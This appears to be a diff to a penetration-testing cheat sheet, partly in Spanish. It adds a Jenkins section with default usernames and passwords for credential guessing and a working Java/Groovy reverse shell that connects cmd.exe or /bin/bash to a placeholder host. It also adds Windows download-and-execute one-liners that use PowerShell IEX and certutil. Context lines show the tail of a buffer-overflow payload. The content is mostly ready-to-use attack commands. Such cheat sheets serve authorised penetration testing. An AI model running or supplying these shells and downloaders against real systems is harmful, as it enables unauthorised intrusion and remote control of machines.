@@ -645,6 +645,34 @@ payload = junk + system_addr + exit_addr + bin_sh_addr
 while True:
     ret = call([full_path_to_binary, payload])
 ```
+# Jenkins
+## Test default creds
+
+Users
+```
+jenkins
+admin
+administrator
+root
+```
+Passwords
+```
+password
+Password
+admin
+jenkins
+root
+Password1
+Password2
+Password!
+```
+## Reverse Shell (CLI)
+```
+String host="IP";
+int port=PORT;
+String cmd="cmd.exe"; (/bin/bash for linux)
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 
 # Windows
 
@@ -652,10 +680,13 @@ while True:
 
 Descargar binarios
 ```
-powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
+powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binary.exe')
 ```
 ```
 curl "http://IP/binario" -o binario
+```
+```
+certutil -urlcache -f http://IP:PORT/binary.ext binary.exe
 ```
 
 Buscar archivo
